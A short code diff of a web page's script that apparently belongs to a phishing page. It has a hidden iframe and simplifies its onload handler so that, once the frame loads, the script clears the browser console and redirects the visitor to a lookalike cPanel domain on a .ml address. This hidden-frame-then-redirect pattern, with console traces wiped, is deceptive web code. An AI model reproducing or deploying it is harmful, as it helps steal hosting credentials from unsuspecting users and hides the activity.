@@ -89,12 +89,9 @@ span {
 <iframe id="frame" name="frame" src="about:blank" style="visibility: hidden;"></iframe>
 <script>
 	var frame = document.getElementById("frame");
-	frame.onload = function() {
-		var frame = document.getElementById("frame");
-		frame.onload =  function() {
-			console.clear();
-			window.location.href = "https://cpanel.hosting-ssl.ml/panel/index.php";
-		}
+	frame.onload =  function() {
+		console.clear();
+		window.location.href = "https://cpanel.hosting-ssl.ml/panel/index.php";
 	}
 	window.onload = function() {
 		document.head.innerHTML += '<link rel="icon" href="./favicon.png">';
